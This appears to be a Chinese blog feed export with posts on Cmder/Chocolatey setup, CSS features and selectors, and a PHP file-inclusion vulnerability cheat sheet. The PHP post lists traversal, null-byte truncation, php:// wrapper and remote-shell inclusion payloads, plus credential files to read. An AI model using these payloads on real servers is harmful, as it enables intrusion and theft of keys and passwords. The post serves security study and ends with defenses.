        
        
        <tags>
            
            <tag> Security </tag>
            
            <tag> Pentest </tag>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在 windows 下安装 Cmder]]></title>
      <url>/2017/04/install-cmder-on-windows/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>Cmder 是一款 windows 环境下非常简洁美观易用轻量的 cmd 替代者，它支持了大部分的 Liunx 命令<a id="more"></a></p><h1 id="Cmder-介绍"><a href="#Cmder-介绍" class="headerlink" title="Cmder 介绍"></a>Cmder 介绍</h1><p><a href="//cmder.net/">Cmder官网</a>（它把 conemu，msysgit 和 clink 打包在一起，让你无需配置就能使用一个真正干净的 Linux 终端！它甚至还附带了漂亮的 monokai 配色主题。）;作为一个压缩档的存在, 可即压即用。你甚至可以放到 USB 就可以虽时带着走，连调整过的设定都会放在这个目录下，不会用到系统机码(Registry)，所以也很适合放在 Dropbox / Google Drive / OneDrive 共享于多台电脑。</p><h1 id="安装-Cmder"><a href="#安装-Cmder" class="headerlink" title="安装 Cmder"></a>安装 Cmder</h1><p>推荐去官网下载：<a href="//cmder.net/">Cmder 官网</a></p><p>下载的时候，有两个版本，分别是 mini 与 full 版；唯一的差别在于有没有内建 msysgit 工具，这是 Git for Windows 的标准配备；全安装版 Cmder自带了 msysgit,除了 git 本身这个命令之外, 里面可以使用大量的 linux 命令；比如 grep, curl(没有 wget)； 像 vim, grep, tar, unzip, ssh, ls, bash, perl 等。</p><p>可能需要翻墙，这里提供另外的下载地址</p><blockquote><p><a href="http://oaq0p7t2g.bkt.clouddn.com/cmder.zip?attname=" target="_blank" rel="external">cmder.zip</a> <a href="http://oaq0p7t2g.bkt.clouddn.com/cmder_mini.zip?attname=" target="_blank" rel="external">cmder_mini.zip</a></p></blockquote><p>可能提 <code>api-ms-crt-runtime</code></p><blockquote><p>安装一些运行库 <a href="http://oaq0p7t2g.bkt.clouddn.com/MSVBCRT_AIO.7z?attname=" target="_blank" rel="external">MSVBCRT_AIO.7z</a></p></blockquote><h1 id="Cmder-元件组成"><a href="#Cmder-元件组成" class="headerlink" title="Cmder 元件组成"></a>Cmder 元件组成</h1><p>Cmder其实结合了多套软体，其中包括 msysgit 与最重要的 ConEmu 与 Clink 软体，而 ConEmu 与 Clink 这两套软体就是 Cmder 真正的核心元件。</p><ul><li><strong>msysgit</strong> 除了提供 <code>Git for Windows</code> 相关工具外，其实还提供了多套 Unix/Linux 环境下常用的指令列工具，例如 less, ls, tar, unzip, md5sum, grep, sed, … 等多套工具。光是一个 grep 就不知道比 Windows 内建的 findstr 强几百倍了！</li><li><strong>ConEmu</strong> 也可以是单独一款软件存在，曾经一度迷恋于它，然而其体验并不如 cmder，便放弃它了。</li><li><strong>Clink</strong> 将 GNU Readline 函式库整合进原生的 Windows 命令提示字元视窗，提供命令列模式下强大的编辑与输入能力，这也是用了Cmder之后会这么像在 Linux 环境下使用的感觉。</li></ul><h1 id="配置-Cmder"><a href="#配置-Cmder" class="headerlink" title="配置 Cmder"></a>配置 Cmder</h1><h2 id="启动-Cmder"><a href="#启动-Cmder" class="headerlink" title="启动 Cmder"></a>启动 Cmder</h2><p>因为它是即压即用的存在，所以点击 <code>Cmder.exe</code> 即可运行。很显然这般打开它，不怎么快捷，即便用 Listary 高效搜索到它，然后点击也是很麻烦的;</p><p>我们可以这样做:</p><ul><li><p>把 Cmder 加到环境变量</p><ul><li>可以把 <code>Cmder.exe</code> 存放的目录添加到系统环境变量；加完之后,<code>Win+r</code> 一下输入cmder,即可</li></ul></li><li><p>添加 Cmder 到右键菜单</p><ul><li>在某个文件夹中打开终端, 这个是一个(超级)痛点需求, 实际上上一步的把 Cmder 加到环境变量就是为此服务的, 在管理员权限的终端输入以下语句即可: <code>Cmder.exe /REGISTER ALL</code></li></ul></li></ul><h2 id="打开一个管理员权限终端"><a href="#打开一个管理员权限终端" class="headerlink" title="打开一个管理员权限终端"></a>打开一个管理员权限终端</h2><p>在任意一个 Cmder 窗口输入 <code>Ctrl+t</code>, 或者在Cmder 窗口中点击下方控制条的绿色加号, 勾选 <code>Run as administrator</code></p><p><img src="http://oaq0p7t2g.bkt.clouddn.com/install-cmder-1.png" alt="安装 Cmder"></p><h2 id="设置命令的别名"><a href="#设置命令的别名" class="headerlink" title="设置命令的别名"></a>设置命令的别名</h2><pre><code class="bash">la=ls -aF --show-control-chars --color
ll=ls -alF --show-control-chars --color
ls=ls --show-control-chars -F --color
</code></pre><p>添加至 <code>cmder/config/user-aliases.cmd</code> 文件末尾</p><h2 id="修改命令提示符号"><a href="#修改命令提示符号" class="headerlink" title="修改命令提示符号"></a>修改命令提示符号</h2><p>Cmder 预设的命列列提示符号是 <code>λ</code>;如果用着不习惯，可以将这个字元改成 <code>Mac/Linux</code>环境下常见的 <code>$</code> 符号，具体操作如下：</p><p>编辑 Cmder 安装目录下的 <code>vendor\clink.lua</code> 批处理文件(min 版本 15 行，full 版本 41 行)，把：</p><pre><code class="bat">local cmder_prompt = &quot;\x1b[1;32;40m{cwd} {git}{hg} \n\x1b[1;30;40m{lamb} \x1b[0m&quot;
</code></pre><p>修改成</p><pre><code class="bat">local cmder_prompt = &quot;\x1b[1;32;40m{cwd} {git}{hg} \n\x1b[1;30;40m$ \x1b[0m&quot;
</code></pre><p>其实就是将 <code>{lamb}</code> 替换成 <code>$</code> 就好</p><h1 id="Chocolatey-软件包管理系统"><a href="#Chocolatey-软件包管理系统" class="headerlink" title="Chocolatey 软件包管理系统"></a>Chocolatey 软件包管理系统</h1><p>在 Linux 下，大家喜欢用 <code>apt-get</code>(mac下用 <code>brew</code>) 来安装应用程序，如今在 windows 下，大家可以使用 Chocolatey 来快速下载搭建一个开发环境。Chocolatey 的哲学就是完全用命令行来安装应用程序， 它更像一个包管理工具（背后使用 Nuget ）</p><p>另外需要说明的是， Chocolatey 只是把官方下载路径封装到了 Chocolatey 中，所以下载源都是其官方路径，所以下载的一定是合法的，但是如果原软件是需要 Licence 注册的话，那么 Chocolatey 下载安装好的软件还是需要你去购买注册。不过 Chocolatey 一般还是会选用免费 Licence 可用的软件。</p><h2 id="安装-chocolatey"><a href="#安装-chocolatey" class="headerlink" title="安装 chocolatey"></a>安装 chocolatey</h2><p>运行如下命令即可(需要管理员权限)：</p><pre><code class="bash">@powershell -NoProfile -ExecutionPolicy unrestricted -Command &quot;iex ((new-object net.webclient).DownloadString(&#39;//chocolatey.org/install.ps1&#39;))&quot; &amp;&amp; SET PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin
</code></pre><p>出现 <code>Chocolatey (choco.exe) is now ready.</code> 字样表示安装成功</p><h2 id="choco-安装软件"><a href="#choco-安装软件" class="headerlink" title="choco 安装软件"></a>choco 安装软件</h2><p>安装软件命令 <code>choco install softwareName</code>, 短写是 <code>cinst softwareName</code></p><p>可安装的应用程序，默认安装在 <code>C:\Program Files\</code>，可以参见其 <a href="//chocolatey.org/packages">Package 列表</a></p><p>以下是 window 下开发常用的开发环境应用:</p><pre><code class="bash">choco install autohotkey.portable    #安装 AutoHotkey (Portable)
choco install nodejs.install  #安装 node
choco install git.install     #安装 git
choco install ruby            #安装 ruby
choco install python          #安装 python
choco install jdk8            #安装 JDK8
choco install googlechrome    #安装 Chrome
choco install google-chrome-x64 #Google Chrome (64-bit only)
choco install firefox         #安装 firefox
choco install notepadplusplus.install #安装 notepad++
choco install Atom                    #安装 Atom
choco install SublimeText3            #安装 SublimeText3
</code></pre><h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><p>可以利用 Tab，自动路径补全 打开设置面板 =&gt; <code>Win+Alt+P</code> 打开新的页签 =&gt; <code>Ctrl+T</code> 关闭页签 =&gt; <code>Ctrl+W</code> 切换页签 =&gt; <code>Ctrl+Tab</code> 关闭所有页签 =&gt; <code>Alt+F4</code> 快速打开一个 CMD =&gt; <code>Shift+Alt+1</code> 快速打开一个 PowerShell =&gt; <code>Shift+Alt+2</code> 快速打开一个 PowerShell(系统管理员权限) =&gt; <code>Shift+Alt+2</code> 快速切换到第 1 个页签 =&gt; <code>Ctrl+1</code> 快速切换到第 n 个页签(n值无上限) =&gt; <code>Ctrl+n</code> 历史命令搜索 =&gt; <code>Ctr+r</code> 全屏 =&gt; <code>Alt+Enter</code></p><h1 id="另一个重量级工具"><a href="#另一个重量级工具" class="headerlink" title="另一个重量级工具"></a>另一个重量级工具</h1><blockquote><p><a href="//www.cygwin.com/">cygwin</a> 官网<br><br>此工具非常庞大，其实就是将 Liunx 上的命令转换成 windows 上可执行的 exe 程序，同时还会在真机上装一个 Liunx 系统，占用磁盘大小就在于你装了几个命令，虽然不推介使用，但是喜欢折腾的童鞋可以去官网上将其下载下来。</p></blockquote><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Windows </tag>
            
            <tag> Command </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP 文件包含漏洞总结]]></title>
      <url>/2017/04/php-file-inclusion/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>PHP 文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入<a id="more"></a></p><h1 id="常见文件包含函数"><a href="#常见文件包含函数" class="headerlink" title="常见文件包含函数"></a>常见文件包含函数</h1><ul><li><strong>include()</strong>：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行</li><li><strong>require()</strong>：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本</li><li><strong>include_once()</strong>和<strong>require_once()</strong>：若文件中代码已被包含则不会再次包含</li></ul><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><p>程序用 include() 等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量</p><p>注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析， 若文件内容不符合PHP语法规范则会暴漏其源码。</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><ul><li>执行任意代码</li><li>包含恶意文件控制网站</li><li>甚至控制服务器</li></ul><h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><ul><li><p>本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码</p><ul><li>上传图片马，然后包含</li><li>读敏感文件，读 PHP 文件</li><li>包含日志文件 GetShell</li><li>包含 /proc/self/envion 文件 GetShell</li><li>包含 data: 或 php://input 等伪协议</li><li>若有 phpinfo 则可以包含临时文件</li></ul></li><li><p>远程文件包含：可以直接执行任意代码</p><ul><li>要保证 php.ini中allow_url_fopen 和 allow_url_include 要为 On</li></ul></li></ul><h1 id="普通本地文件包含"><a href="#普通本地文件包含" class="headerlink" title="普通本地文件包含"></a>普通本地文件包含</h1><pre><code class="php">&lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;]); ?&gt;
</code></pre><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="包含同目录下的文件"><a href="#包含同目录下的文件" class="headerlink" title="包含同目录下的文件"></a>包含同目录下的文件</h3><blockquote><p>?file=.htaccess</p></blockquote><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><blockquote><p>?file=../../../../../../../../../var/lib/locate.db<br><br>?file=../../../../../../../../../var/lib/mlocate/mlocate.db<br><br>(linux 中这两个文件储存着所有文件的路径，需要 root 权限)</p></blockquote><h3 id="包含错误日志"><a href="#包含错误日志" class="headerlink" title="包含错误日志"></a>包含错误日志</h3><blockquote><p>?file=../../../../../../../../../var/log/apache/error.log</p></blockquote><h3 id="获取-web-目录或者其他配置文件"><a href="#获取-web-目录或者其他配置文件" class="headerlink" title="获取 web 目录或者其他配置文件"></a>获取 web 目录或者其他配置文件</h3><blockquote><p>?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf</p></blockquote><h3 id="包含上传的附件"><a href="#包含上传的附件" class="headerlink" title="包含上传的附件"></a>包含上传的附件</h3><blockquote><p>?file=../attachment/media/xxx.file</p></blockquote><h3 id="读取-session-文件"><a href="#读取-session-文件" class="headerlink" title="读取 session 文件"></a>读取 session 文件</h3><blockquote><p>?file=../../../../../../tmp/sess<em>tnrdo9ub2tsdurntv0pdir1no7<br><br>(session 文件一般在 /tmp 目录下，格式为 `sess\</em>[your phpsessid value]`，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell)</p></blockquote><h3 id="系统中重要文件-需要-root-权限"><a href="#系统中重要文件-需要-root-权限" class="headerlink" title="系统中重要文件(需要 root 权限)"></a>系统中重要文件(需要 root 权限)</h3><ul><li><code>/root/.ssh/authorized_keys</code></li><li><code>/root/.ssh/id_rsa</code></li><li><code>/root/.ssh/id_rsa.keystore</code></li><li><code>/root/.ssh/id_rsa.pub</code></li><li><code>/root/.ssh/known_hosts</code></li><li><code>/etc/shadow</code></li><li><code>/root/.bash_history</code></li><li><code>/root/.mysql_history</code></li><li><code>/proc/self/fd/fd[0-9]* (文件标识符)</code></li><li><code>/proc/mounts</code></li><li><code>/proc/config.gz</code></li></ul><h1 id="有限制的本地文件包含"><a href="#有限制的本地文件包含" class="headerlink" title="有限制的本地文件包含"></a>有限制的本地文件包含</h1><pre><code class="php">&lt;?php include(&quot;inc/&quot; . $_GET[&#39;file&#39;] . &quot;.htm&quot;); ?&gt;
</code></pre><h2 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="00-截断"><a href="#00-截断" class="headerlink" title="%00 截断"></a>%00 截断</h3><blockquote><p>?file=../../../../../../../../../etc/passwd%00<br><br>(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p></blockquote><h3 id="00-截断目录遍历"><a href="#00-截断目录遍历" class="headerlink" title="%00 截断目录遍历"></a>%00 截断目录遍历</h3><blockquote><p>?file=../../../../../../../../../var/www/%00<br><br>(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p></blockquote><h3 id="路径长度截断："><a href="#路径长度截断：" class="headerlink" title="路径长度截断："></a>路径长度截断：</h3><blockquote><p>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.<br><br>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p></blockquote><h3 id="点号截断："><a href="#点号截断：" class="headerlink" title="点号截断："></a>点号截断：</h3><blockquote><p>?file=../../../../../../../../../boot.ini/………[…]…………<br><br>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p></blockquote><h1 id="普通远程文件包含"><a href="#普通远程文件包含" class="headerlink" title="普通远程文件包含"></a>普通远程文件包含</h1><pre><code class="php">&lt;?php include($_GET[&#39;file&#39;]); ?&gt;
</code></pre><h2 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="远程代码执行："><a href="#远程代码执行：" class="headerlink" title="远程代码执行："></a>远程代码执行：</h3><blockquote><p>?file=[http|https|ftp]://example.com/shell.txt<br><br>(需要allow_url_fopen=On并且 allow_url_include=On)</p></blockquote><h3 id="利用-php-流-input："><a href="#利用-php-流-input：" class="headerlink" title="利用 php 流 input："></a>利用 php 流 input：</h3><blockquote><p>?file=php://input<br><br>(需要allow_url_include=On)</p></blockquote><h3 id="利用-php-流-filter："><a href="#利用-php-流-filter：" class="headerlink" title="利用 php 流 filter："></a>利用 php 流 filter：</h3><blockquote><p>?file=php://filter/convert.base64-encode/resource=index.php<br><br>(需要allow_url_include=On)</p></blockquote><h3 id="利用-data-URIs："><a href="#利用-data-URIs：" class="headerlink" title="利用 data URIs："></a>利用 data URIs：</h3><blockquote><p>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=<br><br>(需要allow_url_include=On)</p></blockquote><h3 id="利用-XSS-执行任意代码："><a href="#利用-XSS-执行任意代码：" class="headerlink" title="利用 XSS 执行任意代码："></a>利用 XSS 执行任意代码：</h3><blockquote><p>?file=<a href="http://127.0.0.1/path/xss.php?xss=phpcode" target="_blank" rel="external">http://127.0.0.1/path/xss.php?xss=phpcode</a><br><br>(需要allow_url_fopen=On，allow_url_include=On并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。条件非常极端和特殊- -)</p></blockquote><h1 id="有限制的远程文件包含"><a href="#有限制的远程文件包含" class="headerlink" title="有限制的远程文件包含"></a>有限制的远程文件包含</h1><pre><code class="php">&lt;?php include($_GET[&#39;file&#39;] . &quot;.htm&quot;); ?&gt;
</code></pre><blockquote><p>?file=<a href="http://example.com/shell" target="_blank" rel="external">http://example.com/shell</a><br><br>?file=<a href="http://example.com/shell.txt?" target="_blank" rel="external">http://example.com/shell.txt?</a><br><br>?file=<a href="http://example.com/shell.txt%23" target="_blank" rel="external">http://example.com/shell.txt%23</a><br><br>(需要allow_url_fopen=On并且allow_url_include=On)<br><br>?file=\evilshare\shell.php (只需要allow_url_include=On)</p></blockquote><h1 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h1><p>其实在前面也说了，这些漏洞产生原因是PHP函数在引入文件时，传入的文件名没有经过合理的校验，从而操作了预想之外的文件。实际上我们操作文件的函数不只是include()一个，上面提到的一些截断的方法同样可以适用于以下函数：</p><ul><li><strong>fopen</strong></li><li><strong>file_get_contents</strong></li><li><strong>copy</strong></li><li><strong>parse_ini_file</strong></li><li><strong>readfile</strong></li><li><strong>file_put_contents</strong></li><li><strong>mkdir</strong></li><li><strong>tempnam</strong></li><li><strong>move_uploaded_file</strong></li><li><strong>rename</strong></li><li><strong>unlink</strong></li><li><strong>rmdir</strong></li><li><strong>require</strong></li><li><strong>require_once</strong></li><li><strong>include_once</strong></li><li><strong>ZipArchive::open()</strong></li></ul><h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><ul><li>PHP中使用open_basedir配置，将访问限制在指定区域</li><li>过滤 <code>./\</code></li><li>禁止服务器远程文件包含</li></ul><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> pentest </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Security </tag>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSS 的新特性]]></title>
      <url>/2017/03/css-new-features/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>在众多的 CSS 新特性中，有 3 个采用的新特性值得我们一起学习，这里将记录这些新特性的使用方法<a id="more"></a></p><h1 id="特性查询"><a href="#特性查询" class="headerlink" title="特性查询"></a>特性查询</h1><p>特性查询，使用 <code>@supports</code> 规则，允许我们将 CSS 包含在一个条件块中，这个条件块中会检查当前 <code>user agent</code> 是否支持一个 CSS 属性键值对，在支持的情况下其中的内容才会生效。</p><p>这里有一个简单的例子，只在浏览器支持 Flexbox 的时候应用 <code>display: flex</code></p><pre><code class="css">@supports ( display: flex ) {
  .foo { display: flex; }
}
</code></pre><p>另外，使用像 and 和 not 这样的运算符，我们甚至可以创建更复杂的特性查询。</p><p>比如，我们可以检测浏览器是否仅仅支持老的 Flexbox 语法 -</p><pre><code class="css">@supports ( display: flexbox )
          and
          ( not ( display: flex ) ) {
  .foo { display: flexbox; }
}
</code></pre><h2 id="支持情况"><a href="#支持情况" class="headerlink" title="支持情况"></a>支持情况</h2><p><img src="http://oaq0p7t2g.bkt.clouddn.com/css-new-features-1.png" alt="CSS 的新特性"></p><h1 id="表格布局"><a href="#表格布局" class="headerlink" title="表格布局"></a>表格布局</h1><p>CSS 表格布局模块 所定义的系统用于创建基于表格的布局。它与<code>弹性盒布局</code>模块相似，但它更明确地为页面布局而设计，它们之间存在许多不同的特性。</p><h2 id="明确项目定位"><a href="#明确项目定位" class="headerlink" title="明确项目定位"></a>明确项目定位</h2><p>网格由表格容器(通过 <code>display: grid</code> 创建)和表格项(子组件)组成。在我们的 CSS 中，我们可以清楚的组织表格项的位置和顺序，而这与它们的标记(指 HTML 标记)无关。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/css-new-features-2.gif" alt="CSS 的新特性"></p><p>像上面这张图的布局，它的背后的 CSS 代码是非常简单的</p><pre><code class="css">.hg__header { grid-area: header; }
.hg__footer { grid-area: footer; }
.hg__main { grid-area: main; }
.hg__left { grid-area: navigation; }
.hg__right { grid-area: ads; }

.hg {
  display: grid;
  grid-template-areas: &quot;header header header&quot;
                       &quot;navigation main ads&quot;
                       &quot;footer footer footer&quot;;
  grid-template-columns: 150px 1fr 150px;
  grid-template-rows: 100px
                      1fr
                      30px;
  min-height: 100vh;
}

@media screen and (max-width: 600px) {
  .hg {
    grid-template-areas: &quot;header&quot;
                         &quot;navigation&quot;
                         &quot;main&quot;
                         &quot;ads&quot;
                         &quot;footer&quot;;
    grid-template-columns: 100%;
    grid-template-rows: 100px
                        50px
                        1fr
                        50px
                        30px;
  }
}
</code></pre><h2 id="灵活的长度"><a href="#灵活的长度" class="headerlink" title="灵活的长度"></a>灵活的长度</h2><p><code>CSS Grid</code> 模块引入了一个新的长度单位，<code>fr</code>，它代表了表格容器中剩余空间的一个等分。</p><p>它使得我们在表格容器根据可用空间来为表格项分配高度和宽度成为可能。例如在圣杯布局(<code>Holy Grail Layout</code>)中，我希望 main 分区占据两个边栏之外的所有空间。</p><pre><code class="css">.hg {
  grid-template-columns: 150px 1fr 150px;
}
</code></pre><h2 id="间距"><a href="#间距" class="headerlink" title="间距"></a>间距</h2><p>我们可以使用 <code>grid-row-gap</code>、<code>grid-column-gap</code> 和 <code>grid-gap</code> 属性来明确定义间距。这些属性的值是 <code>&lt;length-percentage(长度百分比)&gt;</code>数据类型 ，是内容区域尺寸的百分比。</p><p>比如，需要 %5 的间距，可以这样写</p><pre><code class="css">.hg {
  display: grid;
  grid-column-gap: 5%;
}
</code></pre><h2 id="支持情况-1"><a href="#支持情况-1" class="headerlink" title="支持情况"></a>支持情况</h2><p><img src="http://oaq0p7t2g.bkt.clouddn.com/css-new-features-3.png" alt="CSS 的新特性"></p><h1 id="原生变量"><a href="#原生变量" class="headerlink" title="原生变量"></a>原生变量</h1><p>最后要说的是原生 CSS 变量。这个模块引入了一种由创建作者定义变量的方法，这个变量可以像 CSS 属性一样赋值。</p><p>比如，假设在我们的样式表中多处用到一个主题颜色，我们可以将其抽象出来保存到变量中，再引用变量，以此代替多次直接写出实际的值。</p><pre><code class="css">:root {
  --theme-colour: cornflowerblue;
}

h1 { color: var(--theme-colour); }
a { color: var(--theme-colour); }
strong { color: var(--theme-colour); }
</code></pre><p>目前在像 SASS 这样 CSS 预处理器中已经可以做到这些事情，但 CSS 变量在浏览器中具有活性。也就是说，它们的值可以实时更新。例如，要改变上例中 <code>--theme-color</code> 属性的值，我们只需要这样做</p><pre><code class="javascript">const rootEl = document.documentElement;
rootEl.style.setProperty(&#39;--theme-colour&#39;, &#39;plum&#39;);
</code></pre><h2 id="支持情况-2"><a href="#支持情况-2" class="headerlink" title="支持情况"></a>支持情况</h2><p><img src="http://oaq0p7t2g.bkt.clouddn.com/css-new-features-4.png" alt="CSS 的新特性"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> HTML5 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSS 选择器介绍]]></title>
      <url>/2017/03/css-selector-introduction/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>CSS 选择器是 WEB 开发中一个重要部分，通过 CSS 选择器，可以提高开发人员的工作效率。在本篇文章中将介绍属性选择器和伪类选择器的基本用法<a id="more"></a></p><h1 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h1><blockquote><p>属性选择器其主要作用是为待遇制定属性的 HTML 元素设置样式。例如，通过制定 div 元素的 id 属性，设置相关样式</p></blockquote><p>属性选择器一共分为 4 种匹配模式选择器：</p><ul><li><strong>完全匹配属性选择器</strong></li><li><strong>包含匹配选择器</strong></li><li><strong>首字符匹配选择器</strong></li><li><strong>尾字符匹配选择器</strong></li></ul><h2 id="完全匹配属性选择器"><a href="#完全匹配属性选择器" class="headerlink" title="完全匹配属性选择器"></a>完全匹配属性选择器</h2><p>其含义就是完全匹配字符串。当 div 元素的 id 属性值为 test 时，利用完全匹配选择器选择任何 id 值 为 test 的元素都使用该样式。如下代码通过指定 id 值将属性设定为红色字体：</p><pre><code class="html">&lt;div id=&quot;article&quot;&gt;测试完全匹配属性选择器&lt;/div&gt;

&lt;style type=&quot;text/css&quot;&gt;
[id=article] {
  color: red;
}
&lt;/style&gt;
</code></pre><h2 id="包含匹配选择器"><a href="#包含匹配选择器" class="headerlink" title="包含匹配选择器"></a>包含匹配选择器</h2><p>包含匹配比完全匹配范围更广。只要元素中的属性包含有指定的字符串，元素就使用该样式。</p><p>其语法是：<code>[attribute*=value]</code>。其中 <code>attribute</code> 指的是属性名，<code>value</code> 指的是属性值，包含匹配采用 <code>“*=”</code> 符号。</p><p>例如下三个 div 元素都符合匹配选择器的选择，并将 div 元素内的字体设置为红色字体：</p><pre><code class="html">&lt;div id=&quot;article&quot;&gt;测试包含匹配属性选择器&lt;/div&gt;
&lt;div id=&quot;subarticle&quot;&gt;测试包含匹配属性选择器&lt;/div&gt;
&lt;div id=&quot;article1&quot;&gt;测试包含匹配属性选择器&lt;/div&gt;

&lt;style type=&quot;text/css&quot;&gt;
[id*=article] {
  color: red;
}
&lt;/style&gt;
</code></pre><h2 id="首字符匹配选择器"><a href="#首字符匹配选择器" class="headerlink" title="首字符匹配选择器"></a>首字符匹配选择器</h2><p>首字符匹配就是匹配属性值开头字符，只要开头字符符合匹配，则元素使用该样式。</p><p>其语法是：<code>[attribute^=value]</code>。其中 <code>attribute</code> 指的是属性名，<code>value</code> 指的是属性值，包含匹配采用 <code>“^=”</code> 符号。</p><p>例如下三个 div 元素使用首字符匹配选择器后，只有 id 为 <code>article</code> 和 <code>article1</code> 的元素才被设置为红色字体：</p><pre><code class="html">&lt;div id=&quot;article&quot;&gt;测试首字符匹配选择器&lt;/div&gt;
&lt;div id=&quot;subarticle&quot;&gt;测试首字符匹配选择器&lt;/div&gt;
&lt;div id=&quot;article1&quot;&gt;测试首字符匹配选择器&lt;/div&gt;

&lt;style type=&quot;text/css&quot;&gt;
[id^=article] {
  color: red;
}
&lt;/style&gt;
</code></pre><h2 id="尾字符匹配选择器"><a href="#尾字符匹配选择器" class="headerlink" title="尾字符匹配选择器"></a>尾字符匹配选择器</h2><p>尾子符匹配跟首字符匹配原理一样。尾子符只匹配结尾的字符串，只要结尾字符串符合匹配，则元素使用该样式。</p><p>其语法是：<code>[attribute$=value]</code>。其中 <code>attribute</code> 指的是属性名，<code>value</code> 指的是属性值，包含匹配采用 <code>“$=”</code> 符号。</p><p>例如下三个 div 元素使用首字符匹配选择器后，只有 id 为 <code>article</code> 和 <code>subarticle</code> 的元素才被设置为红色字体：</p><pre><code class="html">&lt;div id=&quot;article&quot;&gt;测试首字符匹配选择器&lt;/div&gt;
&lt;div id=&quot;subarticle&quot;&gt;测试首字符匹配选择器&lt;/div&gt;
&lt;div id=&quot;article1&quot;&gt;测试首字符匹配选择器&lt;/div&gt;

&lt;style type=&quot;text/css&quot;&gt;
[id$=article] {
  color: red;
}
&lt;/style&gt;
</code></pre><h1 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h1><p>在 CSS3 选择器中，伪类选择器种类非常多。然后在 CSS2.1 时代，伪类选择器就已经存在，例如超链接的四个状态选择器：<code>a:link</code>、<code>a:visited</code>、<code>a:hover</code>、<code>a:active</code>。</p><p>CSS3 增加了非常多的选择器，其中包括：</p><ul><li><code>first-line</code> 伪元素选择器</li><li><code>first-letter</code> 伪元素选择器</li><li><code>not</code> 选择器</li><li><code>root</code> 选择器</li><li><code>empty</code> 选择器</li><li><code>target</code> 选择器</li></ul><h2 id="before-选择器"><a href="#before-选择器" class="headerlink" title="before 选择器"></a>before 选择器</h2><p>before 伪类元素选择器主要作用是在选择某个元素之前插入内容，一般用于清除浮动。</p><p>目前，before 选择器得到支持的浏览器包括：<code>IE8+</code>、<code>Firefox</code>、<code>Chrome</code>、<code>Safari</code>、<code>Opera</code>、<code>Android Browser</code>、<code>iOS Safari</code>。</p><p>befor 选择器的语法是：</p><pre><code class="css">元素标签:before {
  content: &#39;插入内容&#39;
}
</code></pre><p>例如，在 p 元素之前插入 “文字”：</p><pre><code class="css">p:before {
  content: &#39;文字&#39;;
}
</code></pre><h2 id="after"><a href="#after" class="headerlink" title="after"></a>after</h2><p>after 伪类元素选择器和 before 伪类元素选择器原理一样，但 after 是在选择某个元素之后插入内容。</p><p>目前，before 选择器得到支持的浏览器包括：<code>IE8+</code>、<code>Firefox</code>、<code>Chrome</code>、<code>Safari</code>、<code>Opera</code>、<code>Android Browser</code>、<code>iOS Safari</code>。</p><p>after 选择器的语法是：</p><pre><code class="css">元素标签:after {
  content: &#39;插入内容&#39;
}
</code></pre><p>例如，在 p 元素之后插入 “文字”：</p><pre><code class="css">p:after {
  content: &#39;文字&#39;;
}
